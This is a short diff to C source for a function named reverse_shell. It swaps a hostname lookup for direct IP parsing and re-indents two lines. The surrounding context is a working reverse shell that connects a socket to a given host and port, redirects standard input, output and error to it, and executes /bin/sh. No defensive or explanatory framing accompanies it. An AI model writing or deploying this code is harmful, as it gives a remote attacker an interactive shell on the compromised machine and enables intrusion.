@@ -80,9 +80,6 @@ void reverse_shell(char* host,unsigned short int port)
 		perror("socket");
 		return;
 	}
-	server=gethostbyname(host);
-	if(server=NULL)
-		return;
 	bzero((char*)&serv_addr,sizeof(serv_addr));
 	serv_addr.sin_family=AF_INET;
 	serv_addr.sin_addr.s_addr = inet_addr(host);
@@ -92,8 +89,8 @@ void reverse_shell(char* host,unsigned short int port)
 		return;
 	}
 	dup2(sockfd, 0); 
-    dup2(sockfd, 1); 
-    dup2(sockfd, 2);
+    	dup2(sockfd, 1); 
+    	dup2(sockfd, 2);
 	execl("/bin/sh", "/bin/sh", (char *)0);
 	close(sockfd);
 }
